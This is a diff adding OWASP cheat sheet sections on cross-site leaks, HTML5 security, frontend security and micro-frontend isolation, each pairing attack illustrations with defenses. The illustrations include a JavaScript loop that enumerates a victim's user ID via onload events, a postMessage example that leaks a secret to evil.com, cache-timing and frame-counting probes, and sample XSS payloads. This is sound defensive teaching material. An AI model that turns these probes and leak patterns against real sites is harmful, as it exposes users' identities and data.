+If you want to use headers from the Fetch Metadata standard, make sure that your users' browsers support this standard (you can check it [here](https://caniuse.com/?search=sec-fetch)). Also, think about using the appropriate fallback in code if the Sec-Fetch-* header is not included in the request.
+
+### Attacks based on error events
+
+Embedding from resources from other origins is generally allowed. For example, you can embed an image from another origin or even script on your page. What is not permitted is reading cross-origin resource due the SOP policy.
+
+When the browser sends a request for a resource, the server processes the request and decides on the response e.g. (200 OK or 404 NOT FOUND). The browser receives the HTTP response and based on that, the appropriate JavaScript event is fired (onload or onerror).
+
+In this way, we can try to load resources and, based on the response status, infer whether they exist or not in the context of the logged-in victim. Let's look at the following situation:
+
+- `GET /api/user/1234` - 200 OK - currently logged-in user is 1234 because we successfully loaded resource ([onload](https://developer.mozilla.org/en-US/docs/Web/API/GlobalEventHandlers/onload) event fired)
+- `GET /api/user/1235` - 401 Unauthorized  - 1235 is not the ID of the currently logged in user ([onerror](https://developer.mozilla.org/en-US/docs/Web/API/GlobalEventHandlers/onerror) event will be triggered)
+
+Given the above example, an attacker can use JavaScript on his controlled origin to guess the victim's ID by enumerating over all the values in a simple loop.
+
+```javascript
+function checkId(id) {
+    const script = document.createElement('script');
+    script.src = `https://example.com/api/users/${id}`;
+    script.onload = () => {
+        console.log(`Logged user id: ${id}`);
+    };
+    document.body.appendChild(script);
+}
+
+// Generate array [0, 1, ..., 40]
+const ids = Array(41)
+    .fill()
+    .map((_, i) => i + 0);
+
+for (const id of ids) {
+    checkId(id);
+}
+```
+
+Note that the attacker here does not care about reading the response body even though it would not be able to due to solid isolation mechanisms in browsers such as [Cross-Origin Resource Blocking](https://www.chromium.org/Home/chromium-security/corb-for-developers). All it needs is the success information it receives when the `onload` event fires.
+
+#### Defense
+
+##### SubResource protection
+
+In some cases, mechanism of special unique tokens may be implemented to protect our sensitive endpoints.
+
+```
+/api/users/1234?token=be930b8cfb5011eb9a030242ac130003
+```
+
+- Token should be long and unique
+- The back-end must correctly validate the token passed in the request
+
+Although it is pretty effective, the solution generates a significant overhead in proper implementation.
+
+##### Fetch metadata (Sec-Fetch-Site)
+
+This header specifies where the request was sent from, and it takes the following values:
+
+- `cross-site`
+- `same-origin`
+- `same-site`
+- `none` - user directly reached the page
+
+Like Sec-Fetch-Dest, this header is automatically appended by the browser to each request and is part of the Fetch Metadata standard. Example usage:
+
+```javascript
+app.get('/api/users/:id', authorization, (req, res) => {
+    if (req.get('Sec-Fetch-Site') === 'cross-site') {
+        return res.sendStatus(403);
+    }
+
+    // ... more code
+
+    return res.send({ id: 1234, name: 'John', role: 'admin' });
+});
+```
+
+##### Cross-Origin-Resource-Policy (CORP)
+
+If the server returns this header with the appropriate value, the browser will not load resources from our site or origin (even static images) in another application. Possible values:
+
+- `same-site`
+- `same-origin`
+- `cross-origin`
+
+Read more about CORP [here](https://resourcepolicy.fyi/).
+
+### Attacks on postMessage communication
+
+Sometimes in controlled situations we would like, despite SOP, to exchange information between different origins. We can use the postMessage mechanism. See below example:
+
+```javascript
+// Origin: http://example.com
+const site = new URLSearchParams(window.location.search).get('site'); // https://evil.com
+const popup = window.open(site);
+popup.postMessage('secret message!', '*');
+
+// Origin: https://evil.com
+window.addEventListener('message', e => {
+    alert(e.data) // secret message! - leak
+});
+```
+
+#### Defense
+
+##### Specify strict targetOrigin
+
+To avoid situations like the one above, where an attacker manages to get the reference for a window to receive a message, always specify the exact `targetOrigin` in postMessage. Passing to the `targetOrigin` wildcard `*` causes any origin to receive the message.
+
+```javascript
+// Origin: http://example.com
+const site = new URLSearchParams(window.location.search).get('site'); // https://evil.com
+const popup = window.open(site);
+popup.postMessage('secret message!', 'https://sub.example.com');
+
+// Origin: https://evil.com
+window.addEventListener('message', e => {
+    alert(e.data) // no data!
+});
+```
+
+### Frame counting attacks
+
+Information about the number of loaded frames in a window can be a source of leakage. Take for example an application that loads search results into a frame, if the results are empty then the frame does not appear.
+
+![XS-Leaks-Frame-Counting](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/XS_Leaks_Frame_Counting.png)
+
+An attacker can get information about the number of loaded frames in a window by counting the number of frames in a `window.frames` object.
+
+So finally, an attacker can obtain the email list and, in a simple loop, open subsequent windows and count the number of frames. If the number of frames in the opened window is equal to 1, the email is in the client's database of the application used by the victim.
+
+#### Defense
+
+##### Cross-Origin-Opener-Policy (COOP)
+
+Setting this header will prevent cross-origin documents from opening in the same browsing context group. This solution ensures that document A opening another document will not have access to the `window` object. Possible values:
+
+- `unsafe-none`
+- `same-origin-allow-popups`
+- `same-origin`
+
+In case the server returns for example `same-origin` COOP header, the attack fails:
+
+```javascript
+const win = window.open('https://example.com/admin/customers?search=john%40example.com');
+console.log(win.frames.length) // Cannot read property 'length' of null
+```
+
+### Attacks using browser cache
+
+Browser cache helps to significantly reduce the time it takes for a page to load when revisited. However, it can also pose a risk of information leakage. If an attacker is able to detect whether a resource was loaded from the cache after the load time, he will be able to draw some conclusions based on it.
+
+The principle is simple, a resource loaded from cache memory will load incomparably faster than from the server.
+
+![XS Leaks Cache Attack](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/XS_Leaks_Cache_Attack.png)
+
+An attacker can embed a resource on their site that is only accessible to a user with the admin role. Then, using JavaScript, read the load time of a particular resource and, based on this information, deduce whether the resource is in cache or not.
+
+The example selects the first matching [resource timing entry](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByType#return_value) already recorded in the timeline. Set `THRESHOLD` for the measurement context; a short duration alone does not prove a cache hit.
+
+```javascript
+    // Illustrative timing threshold for this measurement context
+    // const THRESHOLD = ...
+
+    const adminImagePerfEntry = window.performance
+        .getEntriesByType('resource')
+        .find((entry) => entry.name.endsWith('admin.svg'));
+
+    if (adminImagePerfEntry && adminImagePerfEntry.duration < THRESHOLD) {
+        console.log('Possible cache hit (timing heuristic)');
+    }
+```
+
+#### Defense
+
+##### Unpredictable tokens for images
+
+This technique is accurate when the user wants the resources to still be cached, while an attacker will not be able to find out about it.
+
+```
+/avatars/admin.svg?token=be930b8cfb5011eb9a030242ac130003
+```
+
+- Tokens should be unique in context of each user
+- If an attacker cannot guess this token, it will not be able to detect whether the resource was loaded from cache
+
+##### Using the Cache-Control header
+
+You can disable the cache mechanism if you accept the degraded performance related to the necessity of reloading resources from the server every time a user visits the site. To disable caching for resources you want to protect, set the response header `Cache-Control: no-store`.
+
+### Quick recommendations
+
+- If your application uses cookies, make sure to set the appropriate [SameSite attribute](#samesite-cookies).
+- Think about whether you really want to allow your application to be embedded in frames. If not, consider using the mechanisms described in the [framing protection](#framing-protection) section.
+- To strengthen the isolation of your application between other origins, use [Cross Origin Resource Policy](#cross-origin-resource-policy-corp) and [Cross Origin Opener Policy](#cross-origin-opener-policy-coop) headers with appropriate values.
+- Use the headers available within Fetch Metadata to build your own resource isolation policy.
+
 ## HTTP Security Response Headers
 
 > **Source:** [HTTP Security Response Headers](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0
@@ -2593,6 +4231,452 @@ As of September 2019 HSTS is supported by [all modern browsers](https://caniuse.
 
 For TLS configuration, see the [Transport Layer Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html).
 
+## HTML5 Security
+
+> **Source:** [HTML5 Security](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0
+
+### Introduction
+
+The following cheat sheet serves as a guide for implementing HTML 5 in a secure fashion.
+
+### Communication APIs
+
+#### Web Messaging
+
+Web Messaging (also known as Cross Domain Messaging) provides a means of messaging between documents from different origins in a way that is generally safer than the multiple hacks used in the past to accomplish this task. However, there are still some recommendations to keep in mind:
+
+- When posting a message, explicitly state the expected origin as the second argument to `postMessage` rather than `*` in order to prevent sending the message to an unknown origin after a redirect or some other means of the target window's origin changing.
+- The receiving page should **always**:
+    - Check the `origin` attribute of the sender to verify the data is originating from the expected location.
+    - Perform input validation on the `data` attribute of the event to ensure that it's in the desired format.
+- Don't assume you have control over the `data` attribute. A single [Cross Site Scripting](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) flaw in the sending page allows an attacker to send messages of any given format.
+- Both pages should only interpret the exchanged messages as **data**. Never evaluate passed messages as code (e.g. via `eval()`) or insert it to a page DOM (e.g. via `innerHTML`), as that would create a DOM-based XSS vulnerability. For more information see [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).
+- To assign the data value to an element, instead of using a insecure method like `element.innerHTML=data;`, use the safer option: `element.textContent=data;`
+- Check the origin properly exactly to match the FQDN(s) you expect. Note that the following code: `if(message.origin.indexOf(".owasp.org")!=-1) { /* ... */ }` is very insecure and will not have the desired behavior as `owasp.org.attacker.com` will match.
+- If you need to embed external content/untrusted gadgets and allow user-controlled scripts (which is highly discouraged), please check the information on [sandboxed frames](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#sandboxed-frames).
+
+#### Cross Origin Resource Sharing
+
+- Validate URLs passed to `XMLHttpRequest.open`. Current browsers allow these URLs to be cross domain; this behavior can lead to code injection by a remote attacker. Pay extra attention to absolute URLs.
+- Ensure that URLs responding with `Access-Control-Allow-Origin: *` do not include any sensitive content or information that might aid attacker in further attacks. Use the `Access-Control-Allow-Origin` header only on chosen URLs that need to be accessed cross-domain. Don't use the header for the whole domain.
+- Allow only selected, trusted domains in the `Access-Control-Allow-Origin` header. Prefer allowing specific domains over blocking or allowing any domain (do not use `*` wildcard nor blindly return the `Origin` header content without any checks).
+- Keep in mind that CORS does not prevent the requested data from going to an unauthorized location. It's still important for the server to perform usual [CSRF](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) prevention.
+- While the [Fetch Standard](https://fetch.spec.whatwg.org/#http-cors-protocol) recommends a pre-flight request with the `OPTIONS` verb, current implementations might not perform this request, so it's important that "ordinary" (`GET` and `POST`) requests perform any access control necessary.
+- Discard requests received over plain HTTP with HTTPS origins to prevent mixed content bugs.
+- Don't rely only on the Origin header for Access Control checks. Browser always sends this header in CORS requests, but may be spoofed outside the browser. Application-level protocols should be used to protect sensitive data.
+
+#### WebSockets
+
+- Check out [WebSocket Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html) to learn about WebSocket specific protections.
+
+#### Server-Sent Events
+
+- Validate URLs passed to the `EventSource` constructor. [Cross-origin connections use CORS](https://html.spec.whatwg.org/multipage/server-sent-events.html#dom-eventsource) and require permission from the event-stream server.
+- As mentioned before, process the messages (`event.data`) as data and never evaluate the content as HTML or script code.
+- Always check the origin attribute of the message (`event.origin`) to ensure the message is coming from a trusted domain. Use an allow-list approach.
+
+### Storage APIs
+
+#### Local Storage
+
+- Also known as Offline Storage, Web Storage. Underlying storage mechanism may vary from one user agent to the next. In other words, any authentication your application requires can be bypassed by a user with local privileges to the machine on which the data is stored. Therefore, it's recommended to avoid storing any sensitive information in local storage where authentication would be assumed.
+- Due to the browser's security guarantees it is appropriate to use local storage where access to the data is not assuming authentication or authorization.
+- Use the object sessionStorage instead of localStorage if persistent storage is not needed. sessionStorage object is available only to that window/tab until the window is closed.
+- A single [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/) can be used to steal all the data in these objects, so again it's recommended not to store sensitive information in local storage.
+- A single [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/) can be used to load malicious data into these objects too, so don't consider objects in these to be trusted.
+- Pay extra attention to "localStorage.getItem" and "setItem" calls implemented in HTML5 page. It helps in detecting when developers build solutions that put sensitive information in local storage, which can be a severe risk if authentication or authorization to that data is incorrectly assumed.
+- Do not store session identifiers in local storage as the data is always accessible by JavaScript. Cookies can mitigate this risk using the `httpOnly` flag.
+- There is no way to restrict the visibility of an object to a specific path like with the attribute path of HTTP Cookies, every object is shared within an origin and protected with the Same Origin Policy. Avoid hosting multiple applications on the same origin, all of them would share the same localStorage object, use different subdomains instead.
+
+#### Client-side databases
+
+- Web SQL Database was deprecated by the W3C in 2010 and is **removed from all major browsers**: Chromium dropped support in version 119 (October 2023) and Safari/Firefox never shipped it for third-party origins. Do not use Web SQL. If you specifically need an SQL interface in the browser, prefer running an embedded engine such as the official [SQLite WebAssembly build (`sqlite-wasm`)](https://sqlite.org/wasm/doc/trunk/about.md), backed by IndexedDB or the Origin Private File System (OPFS) for persistence.
+- The current standard for client-side structured storage is **[IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API)**, a transactional key-value store that has been a W3C Recommendation since 2015 and is supported in all evergreen browsers.
+- Underlying storage mechanisms vary across user agents and operating systems. A user or process with access to the browser profile can read or modify stored data; do not assume IndexedDB provides confidentiality. Avoid storing session tokens, credentials, or other secrets there. If sensitive data must be stored locally, design encryption and key management for the device-access threat. A non-extractable `CryptoKey` restricts Web Crypto export operations, but [does not guarantee protection of persisted keys from device access or prevent hostile scripts from using the key](https://www.w3.org/TR/webcrypto/#security-developers).
+- A single [Cross-Site Scripting](https://owasp.org/www-community/attacks/xss/) vulnerability can read or write any data in IndexedDB; treat its contents as untrusted input on read.
+- Apply the same input validation and output encoding rules to data coming from IndexedDB as you would to data coming from the network.
+
+### Geolocation
+
+- The [Geolocation API](https://www.w3.org/TR/2021/WD-geolocation-20211124/#security) requires that user agents ask for the user's permission before calculating location. Whether or how this decision is remembered varies from browser to browser. Some user agents require the user to visit the page again in order to turn off the ability to get the user's location without asking, so for privacy reasons, it's recommended to require user input before calling `getCurrentPosition` or `watchPosition`.
+
+### Web Workers
+
+- Web Workers are allowed to use `XMLHttpRequest` object to perform in-domain and Cross Origin Resource Sharing requests. See relevant section of this Cheat Sheet to ensure CORS security.
+- While Web Workers don't have access to DOM of the calling page, malicious Web Workers can use excessive CPU for computation, leading to Denial of Service condition or abuse Cross Origin Resource Sharing for further exploitation. Ensure code in all Web Workers scripts is not malevolent. Don't allow creating Web Worker scripts from user supplied input.
+- Validate messages exchanged with a Web Worker. Do not try to exchange snippets of JavaScript for evaluation e.g. via `eval()` as that could introduce a [DOM Based XSS](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html) vulnerability.
+
+### Tabnabbing
+
+Attack is described in detail in this [article](https://owasp.org/www-community/attacks/Reverse_Tabnabbing).
+
+To summarize, it's the capacity to act on parent page's content or location from a newly opened page via the back link exposed by the **opener** JavaScript object instance.
+
+It applies to an HTML link or a JavaScript `window.open` function using the attribute/instruction `target` to specify a [target loading location](https://www.w3schools.com/tags/att_a_target.asp) that does not replace the current location and then makes the current window/tab available.
+
+To prevent this issue, the following actions are available:
+
+Cut the back link between the parent and the child pages:
+
+- For HTML links:
+    - To cut this back link, add the attribute `rel="noopener"` on the tag used to create the link from the parent page to the child page. This attribute value cuts the link, but depending on the browser, lets referrer information be present in the request to the child page.
+    - To also remove the referrer information use this attribute value: `rel="noopener noreferrer"`.
+- For the JavaScript `window.open` function, add the values `noopener,noreferrer` in the [windowFeatures](https://developer.mozilla.org/en-US/docs/Web/API/Window/open) parameter of the `window.open` function.
+
+As the behavior using the elements above is different between the browsers, either use an HTML link or JavaScript to open a window (or tab), then use this configuration to maximize the cross supports:
+
+- For [HTML links](https://www.scaler.com/topics/html/html-links/), add the attribute `rel="noopener noreferrer"` to every link.
+- For JavaScript, use this function to open a window (or tab):
+
+```javascript
+function openPopup(url, name, windowFeatures = "") {
+  const features = ["noopener", "noreferrer", windowFeatures]
+    .filter(Boolean)
+    .join(",");
+  window.open(url, name, features);
+}
+```
+
+- Add the HTTP response header `Referrer-Policy: no-referrer` to every HTTP response sent by the application ([Header Referrer-Policy information](https://owasp.org/www-project-secure-headers/). This configuration will ensure that no referrer information is sent along with requests from the page.
+
+Compatibility matrix:
+
+- [noopener](https://caniuse.com/#search=noopener)
+- [noreferrer](https://caniuse.com/#search=noreferrer)
+- [referrer-policy](https://caniuse.com/#feat=referrer-policy)
+
+### Sandboxed frames
+
+- Use the `sandbox` attribute of an `iframe` for untrusted content.
+- The `sandbox` attribute of an `iframe` enables restrictions on content within an `iframe`. The following restrictions are active when the `sandbox` attribute is set:
+    1. All markup is treated as being from a unique origin.
+    2. All forms and scripts are disabled.
+    3. All links are prevented from targeting other browsing contexts.
+    4. All features that trigger automatically are blocked.
+    5. All plugins are disabled.
+
+It is possible to have a [fine-grained control](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox) over `iframe` capabilities using the value of the `sandbox` attribute.
+
+- In old versions of user agents where this feature is not supported, this attribute will be ignored. Use this feature as an additional layer of protection or check if the browser supports sandboxed frames and only show the untrusted content if supported.
+- Apart from this attribute, to prevent Clickjacking attacks and unsolicited framing it is encouraged to use the header `X-Frame-Options` which supports the `deny` and `same-origin` values. Other solutions like framebusting `if(window!==window.top) { window.top.location=location;}` are not recommended.
+
+### Credential and Personally Identifiable Information (PII) Input hints
+
+Form attributes provide input and autofill hints; they are not a guarantee that the browser will avoid storing sensitive values.
+
+For sensitive fields where autofill is inappropriate, `autocomplete="off"` requests that the browser not remember or prefill the value. However, [browsers may still offer to save and autofill login credentials](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/autocomplete#description). Do not treat this attribute as protection against credential reuse on a shared computer.
+
+```html
+<input type="text" spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off">
+```
+
+These attributes can adjust input assistance, but do not enforce a no-storage policy:
+
+- `spellcheck="false"`
+- `autocomplete="off"`
+- `autocorrect="off"`
+- `autocapitalize="off"`
+
+### Offline Applications
+
+- The HTML5 Application Cache (`<html manifest="...">` and `.appcache` files) has been **removed from all major browsers** (Firefox 85, Chrome 93). Do not use it for new applications and migrate any remaining usage to **Service Workers** with the [Cache API](https://developer.mozilla.org/en-US/docs/Web/API/Cache).
+- Service Workers run on a separate, scriptable thread and intercept network requests for the registered scope. Because they can transparently serve cached responses, they have a significant security impact:
+    - Only register Service Workers from your own origin and **only serve the worker script over HTTPS** with a long-cache-busting filename (e.g. `sw.<hash>.js`).
+    - Validate that the scope of the Service Worker is restricted (use the `scope` option or the `Service-Worker-Allowed` response header) so a compromised worker cannot intercept unrelated paths.
+    - A malicious or compromised Service Worker can intercept requests from the pages it controls. Have a documented recovery process that [updates or unregisters the worker](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API) and removes affected caches. Expiring cached data does not unregister a worker.
+    - Do not put responses containing sensitive data into the Cache API. [`Cache` does not honor HTTP caching headers, and entries do not expire automatically](https://developer.mozilla.org/en-US/docs/Web/API/Cache); service-worker code must explicitly exclude these responses and delete any sensitive entries already stored. Continue sending `Cache-Control: no-store` to control HTTP caches.
+
+### Progressive Enhancements and Graceful Degradation Risks
+
+- The best practice now is to determine the capabilities that a browser supports and augment with substitutes only for capabilities that are not directly supported. Do not fall back to obsolete browser plugins — Adobe Flash Player reached end-of-life on 31 December 2020 and is removed from all browsers; Java applets, Silverlight, and ActiveX are likewise unsupported. Native HTML5 (`<video>`, `<audio>`, `<canvas>`, WebAssembly) covers these legacy use cases.
+
+### HTTP Headers to enhance security
+
+Consult the project [OWASP Secure Headers](https://owasp.org/www-project-secure-headers/) in order to obtains the list of HTTP security headers that an application should use to enable defenses at browser level.
+
+## Web Frontend Security
+
+> **Source:** [Web Frontend Security](https://cheatsheetseries.owasp.org/cheatsheets/Web_Frontend_Security_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0
+
+### Introduction
+
+This cheat sheet was previously named the AJAX Security Cheat Sheet.
+
+This document will provide a starting point for AJAX security and will hopefully be updated and expanded reasonably often to provide more detailed information about specific frameworks and technologies.
+
+For applications that compose independently deployed frontend features, see the [Micro-Frontend Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Micro_Frontend_Security_Cheat_Sheet.html) for runtime isolation, cross-application messaging, and host-to-remote trust boundaries.
+
+**Before applying any specific control, developers must adopt a fundamental security mindset:**
+All data should be considered untrusted unless explicitly validated and safely handled.
+This applies to:
+
+- Client-side input
+- API response
+- Third-party integrations
+- Internal services and microservices
+- Cached responses
+- Browser storage (localStorage, sessionStorage)
+- Hidden form fields
+
+#### Client-Side (JavaScript)
+
+##### Use `innerHTML` with extreme caution
+
+Manipulating the Document Object Model (DOM) is common in web applications, especially in monolithic server-side rendering (e.g., PHP, ASP.NET) and AJAX-driven applications. While `innerHTML` seems like a convenient way to inject HTML content, it poses significant security risks on untrusted-data, particularly cross-site scripting (XSS).
+
+###### What is `innerHTML`?
+
+The `innerHTML` property sets or gets the HTML content of an element, including tags, which the browser parses and renders as part of the DOM. For example, setting `innerHTML = "<p>Hello</p>"` creates a paragraph element.
+
+###### Why does `innerHTML` require extreme caution?
+
+Using `innerHTML` with untrusted data (e.g., from API responses in AJAX) can allow malicious JavaScript to execute in the user’s browser, leading to XSS vulnerabilities. Potential risks include:
+
+- Stealing user session cookies.
+- Defacing the website.
+- Redirecting users to malicious sites.
+- Performing unauthorized actions (e.g., API calls on behalf of the user).
+- Keylogging user inputs.
+
+###### Vulnerable Example
+
+```javascript
+    document.getElementById('content').innerHTML = data;
+    // DANGER! The server may have returned a payload that executes scripts, for example: <img src=abc onerror=alert('xss!')>.
+```
+
+###### When is `innerHTML` acceptable?
+
+The fundamental security rule is to never use innerHTML with untrusted data. However, in limited cases, such as legacy monolithic applications with no viable alternatives, innerHTML may be used cautiously:
+
+- **Static, Hardcoded HTML**: For small, fixed HTML snippets that are part of your application’s source code and contain no user input:
+
+```javascript
+document.getElementById('footer').innerHTML = '<p>© 2025 My Company. All rights reserved.</p>';
+```
+
+- **Sanitized HTML**: For user-generated HTML (e.g., in rich text editors), sanitize with a library like [DOMPurify](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html#1-html-sanitization) before using innerHTML:
+
+```javascript
+import DOMPurify from 'dompurify';
+const userInput = '<img src=abc onerror=alert("xss")>';
+document.getElementById('content').innerHTML = DOMPurify.sanitize(userInput); // Safe, removes malicious code
+```
+
+###### Alternatives
+
+- Use Templating Engines (with auto-escaping) for reusable, structured HTML snippets.
+- Use framework text bindings, which generally escape text rather than sanitize arbitrary markup; [Vue documents this distinction](https://vuejs.org/guide/best-practices/security). Raw-HTML APIs such as [React's `dangerouslySetInnerHTML`](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html) require trusted, sanitized HTML. URL and style bindings need controls appropriate to their context; see [Framework Security](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#framework-security).
+
+##### Use of `textContent` or `innerText` for DOM updates (for text-only content)
+
+In AJAX and monolithic server-side rendering applications (e.g., PHP, ASP.NET), dynamic Document Object Model (DOM) updates are common for rendering text-only content from APIs or user inputs.
+
+###### What is `textContent`?
+
+The `textContent` property sets or gets the plain text content of an element. It treats inserted HTML tags as literal text and does not parse them. It is ideal for most text-only updates, such as displaying user comments, etc.
+
+```javascript
+const userInput = '<script>alert("OWASP")</script>';
+document.getElementById('content').textContent = userInput; // Displays plain text
+```
+
+###### What is `innerText`?
+
+The `innerText` property sets or gets the visible text content of an element, respecting CSS styling (e.g., ignoring text in `display: none` elements). It also reflects rendered text formatting, such as line breaks or spacing.
+
+```javascript
+const userInput = 'OWASP';
+document.getElementById('content').innerText = userInput;
+```
+
+###### When to Use `textContent` vs. `innerText`
+
+- **Use `textContent`**: Use textContent in monolithic applications to safely insert plain text content returned from APIs.
+- **Use `innerText`**: Only when CSS visibility or rendered text formatting (e.g. ignoring text in `display: none` elements) is required.
+
+> Note: `textContent` is slightly faster and more predictable; use it unless you need to respect rendered text formatting (`innerText`).
+
+###### Note
+
+- While `textContent` and `innerText` are safe for inserting plain text into the DOM, they do not protect against XSS in other contexts such as HTML attributes, JavaScript event handlers, or URLs. Always validate and sanitize untrusted input.
+- Modern Frameworks like React, Vue, Angular, or Svelte automatically update text-only content so there is no need to manually use `textContent` or `innerText`.
+
+##### Don't use `eval()`, `new Function()` or other code evaluation tools
+
+`eval()` function is dangerous, never use it. Needing to use eval() usually indicates a problem in your design.
+
+> Note: Using `eval()` or `new Function()` opens doors to remote code execution and XSS. Avoid it entirely.
+
+##### Encode Data Before Use in an Output Context
+
+When using data to build HTML, script, CSS, XML, JSON, etc., make sure you take into account how that data must be presented in a literal sense to keep its logical meaning.
+
+Data should be properly encoded before being used in this manner to prevent injection style issues, and to make sure the logical meaning is preserved.
+
+[Check out the OWASP Java Encoder Project.](https://owasp.org/www-project-java-encoder/)
+
+##### Don't rely on client logic for security
+
+Don't forget that the user controls the client-side logic. A number of browser plugins are available to set breakpoints, skip code, change values, etc. Never rely on client logic for security.
+
+##### Don't rely on client business logic
+
+As with security logic, make sure any important business rules are duplicated on the server side so a user cannot bypass them, which could lead to unexpected or costly behavior.
+
+##### Avoid writing serialization code
+
+This is hard and even a small mistake can cause large security issues. There are already a lot of frameworks to provide this functionality.
+
+Refer to the [JSON page](https://www.json.org/) for more info.
+
+##### Avoid building XML or JSON dynamically
+
+Just like building HTML or SQL you may cause XML injection bugs, so stay away from this or at least use an encoding library or safe JSON or XML library to make attributes and element data safe.
+
+- [XSS (Cross Site Scripting) Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+
+##### Never transmit secrets to the client
+
+Anything sent to the client can be read or modified by the user, so keep all that secret stuff on the server please.
+
+##### Choose encryption for the threat model
+
+Use TLS for transport. Client-side encryption can also be appropriate for end-to-end protection or encryption before upload, as described in the [Web Cryptography use cases](https://www.w3.org/TR/webcrypto/#use-cases). Use reviewed protocols and implementations rather than designing a cryptographic protocol yourself. Browser cryptography does not protect plaintext or keys from malicious code running in the application; account for XSS and key management as described in the [Web Cryptography security considerations](https://www.w3.org/TR/webcrypto/#security-considerations).
+
+##### Don't perform security impacting logic on client-side
+
+This principle serves as a fail-safe—if a security decision is ambiguous, perform it on the server.
+
+#### Server-Side
+
+##### Use CSRF Protection
+
+Take a look at the [Cross-Site Request Forgery (CSRF) Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) cheat sheet.
+
+##### Protect against JSON hijacking for older browsers
+
+###### Review AngularJS JSON hijacking defense mechanism
+
+See the [JSON Vulnerability Protection](https://docs.angularjs.org/api/ng/service/$http#json-vulnerability-protection) section of the AngularJS documentation.
+
+###### Always return JSON with an object on the outside
+
+Always have the outside primitive be an object for JSON strings:
+
+**Exploitable:**
+
+```json
+[{"object": "inside an array"}]
+```
+
+**Not exploitable:**
+
+```json
+{"object": "not inside an array"}
+```
+
+**Also not exploitable:**
+
+```json
+{"result": [{"object": "inside an array"}]}
+```
+
+##### Avoid writing serialization code server-side
+
+Remember reference vs. value types; use a reviewed library.
+
+##### Services can be called directly by users
+
+Even though you only expect your AJAX client-side code to call those services, a malicious user can also call them directly.
+
+Validate inputs and treat them as if they are under user control.
+
+##### Avoid building XML or JSON by hand, use the framework
+
+Use the framework to serialize data; building payloads by hand can introduce security issues.
+
+##### Use JSON and XML schema for web services
+
+Use a third-party library to validate web service inputs.
+
+## Micro-Frontend Security
+
+> **Source:** [Micro-Frontend Security](https://cheatsheetseries.owasp.org/cheatsheets/Micro_Frontend_Security_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0
+
+### Introduction
+
+Micro-frontends combine independently deployed features in a host application, also called a shell. Separate repositories and deployment teams do not create browser security boundaries: the [same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy) separates origins, not individual features within a page.
+
+This cheat sheet covers the security decisions involved in composing these applications:
+
+- Choose which features may share the host's browser privileges.
+- Limit communication and data sharing between applications.
+- Enforce authorization on the server for every request.
+- Control which remote code each host release loads.
+
+For general browser security controls, see the [Web Frontend Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Web_Frontend_Security_Cheat_Sheet.html).
+
+### Choose and Enforce Runtime Boundaries
+
+Document the origin, deployment owner, and required data access of each micro-frontend before choosing a composition mechanism.
+
+| Composition | Security decision |
+| --- | --- |
+| Remote JavaScript loaded into the host, including Module Federation | Trust the remote with the host page's privileges. A different download origin does not sandbox the executing code. |
+| Web Components in the host page | Treat components as part of the same application. Shadow DOM (Document Object Model) and scoped styles do not isolate their scripts from the host. |
+| Cross-origin iframe | Use when the feature must be separated from the host's DOM and origin storage. Restrict its capabilities and explicitly control messages crossing the boundary. |
+| HTML fragments assembled on a server or at the edge | Review fragments and their scripts as host content. Assembly before delivery does not create a browser isolation boundary. |
+
+#### Isolate Features with Different Trust Levels
+
+Serve a less-trusted feature from a dedicated origin in an iframe. Apply an [iframe sandbox](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe#sandbox), granting only capabilities the feature requires. Leave top-level navigation and popup permissions disabled unless necessary.
+
+Do not combine `allow-scripts` and `allow-same-origin` for content on the host's own origin; that combination can let the embedded application remove its sandbox. `allow-same-origin` preserves the frame's original origin; it does not make a cross-origin frame same-origin with the host.
+
